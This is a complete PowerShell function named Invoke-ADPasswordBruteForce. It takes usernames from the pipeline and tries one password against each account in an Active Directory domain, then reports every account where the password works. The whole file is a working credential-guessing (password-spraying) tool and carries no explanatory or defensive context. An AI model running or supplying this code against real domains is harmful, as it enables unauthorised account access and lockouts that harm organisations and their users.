Function Invoke-ADPasswordBruteForce {
	param(
		[Parameter(Mandatory=$True, ValueFromPipeline=$true)]
		[string]$Username,
		[Parameter(Mandatory=$False)]
		[string]$Domain = (Get-Item env:USERDOMAIN).Value,
		[Parameter(Mandatory=$True)]
		[string]$Password
	)
	
	BEGIN {
		Write-Output "[+] Brute forcing users against the ""$($Domain)"" domain using the password ""$($Password)"""
	}
	
	PROCESS {
		Add-Type -AssemblyName System.DirectoryServices.AccountManagement
		ForEach($User in $Username) {
			Try {
				$Context = [System.DirectoryServices.AccountManagement.ContextType]::Domain
				$PrincipalContext =  New-Object System.DirectoryServices.AccountManagement.PrincipalContext($Context, $Domain)
				
				If($PrincipalContext.ValidateCredentials($User, $password) -eq $True) {
					Write-Output "[+] $($User) password is $($Password)"
				}
			} Catch {
				Write-Output "[-] Error reaching the server. Aborting"
				exit
			}
		}
	}
	
	END {
		Write-Output "[+] Process completed..."
	}
}
